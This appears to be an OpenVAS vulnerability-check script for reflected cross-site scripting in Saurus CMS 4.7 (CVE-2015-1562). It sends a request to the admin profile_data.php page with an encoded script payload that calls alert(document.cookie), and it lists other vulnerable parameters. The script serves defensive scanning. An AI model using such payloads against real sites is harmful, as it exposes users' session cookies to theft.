###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_saurus_cms_mul_xss.nasl 2015-04-13 10:15:43 +0530 Apr$
#
# Saurus CMS Multiple XSS Vulnerabilities
#
# Authors:
# Deepednra Bapna <bdeepednra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805367");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-1562");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-04-13 10:15:43 +0530 (Mon, 13 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Saurus CMS Multiple XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Saurus CMS
  and is prone to multiple xss vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as input passed via,

  - 'search' parameter to the 'user_management.php' script,

  - 'data_search' parameter to the 'profile_data.php' script,

  - 'filter' parameter to the 'error_log.ph' script,
  are not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Saurus CMS version 4.7, Prior versions
  may also be affected.");

  script_tag(name:"solution", value:"Upgrade to the Saurus CMS v. 4.7
  release-date:27.01.2015 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jan/112");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"http://www.saurus.info");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/cms", "/sauruscms", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/admin/"),  port:http_port);

  if(">Saurus CMS" >< rcvRes)
  {
    url = dir + '/admin/profile_data.php?data_search=%22%3E%3Cscript%3E'
              +'alert(document.cookie)%3C/script%3E%3C!--&profile_search=&profile_id=0';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"alert\(document\.cookie\)"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);